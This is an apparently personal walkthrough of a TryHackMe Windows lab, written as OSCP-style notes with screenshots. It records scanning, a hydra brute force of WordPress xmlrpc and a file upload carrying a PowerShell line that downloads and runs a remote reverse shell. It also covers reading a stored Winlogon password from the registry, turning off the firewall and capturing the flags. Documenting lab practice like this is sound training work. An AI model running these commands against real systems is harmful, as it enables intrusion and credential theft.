---
Status: "#Not-Started"
OS:
ip:
Start_Time: 2026-02-10 09:30
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	I started with a nmap quick scan and a completely detailed scan. The scanning results shows that the target is opening several ports, including netbios,ms rpc, database, and several api ports. 
	
![[assets/Pasted image 20260210093403.png]]

![[assets/Pasted image 20260210093424.png]]

```
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
```
```
# Nmap detailed scan
nmap -Pn -sV -sC -p <PORTS> <IP> -oN nmap_detailed
```

	Following the results, I take a look at the target website. The provided ip address leads us to the file index of the target. And I found the php info here. The php info shows that target open file upload and related system information.(Zend engine and maria db)

![[assets/Pasted image 20260210093724.png]]

![[assets/Pasted image 20260210093743.png]]

![[assets/Pasted image 20260210093818.png]]
### 2.2 Directory Enumeration
	I used dirsearch to do a enumeration to the target. The results shows that there are many hidden directories and I found a WP-login page, but it needs credentials.

![[assets/Pasted image 20260210094233.png]]

![[assets/Pasted image 20260210094246.png]]

	I opened the target's wordpress page and find a lost password function. I clicked it and it returned error message " can't find server avenger.tryhackme". So I related the ip address and the avenger.tryhackme together, now the target access it.
---
![[assets/Pasted image 20260210100738.png]]
	I tried to view the xmlrpc.php and it returned " only access post request".

```
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>" http://avenger.tryhackme/wordpress/xmlrpc.php
```
	This command and the returned results verified that target xmlrpc is active.
	
![[assets/Pasted image 20260210101020.png]]

##  3. Initial access
### 3.1 Brute force
	Because target xmlrpc is valid, so I choose to use hydra to brute force it.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt avenger.tryhackme http-post-form "/wordpress/xmlrpc.php:<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>^USER^</value></param><param><value>^PASS^</value></param></params></methodCall>:Incorrect username or password"
```


![[assets/Pasted image 20260210102041.png]]
	And hydra returned several credentials. However, none of them are valid. So I need to reconsider my decision. Clearly brute force is not valid, so may be I missed some valuable information? Back the the target website, this time I take a detailed look of the website.

![[assets/Pasted image 20260211101337.png]]
	I missed a form submission area. It is strange that a training form can upload the files. I made some test and it shows that it accepts almost all file types. This means there are no filter or limit set in this area, so what if I tried to upload a reverse shell here.
```
# This script is for the windows system, target will use the powershell to remotely get the shell.ps1
START /B powershell -c "$code=(New-Object System.Net.Webclient).DownloadString('http://IP:8000/shell.ps1');iex $code"
```
	I uploaded this script and write a shell.ps1. By listening the ports, I get a reverse shell.

![[assets/Pasted image 20260211102017.png]]
	
##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [ ] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).
	I tried to upload winpeas.bat to the target but it seems it is deleted by the antivirus. 
![[assets/Pasted image 20260211102644.png]]
	This time I need to manul check the escalation path. So first I check the privlege I have and the groups I am in.

![[assets/Pasted image 20260211103841.png]]

![[assets/Pasted image 20260211103906.png]]
	This is an admin group and I only have medium privlege. But this is a valuble path, I can check if there are any possible UAC bypass.

```
# check the path name
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
```
# check for any running cronjobs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
	However, both of them have no returns. So I keep checking for any possible credentials here. And superisely I found a credential.

![[assets/Pasted image 20260211110032.png]]
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
![[assets/Pasted image 20260211110114.png]]
	Now, I can try to use xfreerdp3 login.
### 4.2 Escalation Path
	After login, I closed the firewall and try to download the winPEAS.bat. This time I success.
```
Invoke-WebRequest -Uri "http://192.168.172.227:8001/winPEAS.bat" -OutFile "$env:USERPROFILE\winpeas.bat"
```
	I ran the winPEAS, but the most funny thing is I forgot I can ran the powershell as admin. This is because I used xfreerdp3 to login and hugo is a local admin. So I can directly read the content of the root.txt with an admin privilege powershell. I don't need to furthur escalated.

![[assets/Pasted image 20260211113424.png]]

	

---


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash)                              | Screenshot (Link)                           |
| :------------ | :----------------------------------------------- | :------------------------------------------ |
| **user.txt**  | THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY} | ![[assets/Pasted image 20260211110400.png]] |
| **proof.txt** | THM{I_CAN_DO_THIS_ALL_DAY}                       | ![[assets/Pasted image 20260211113433.png]] |

---

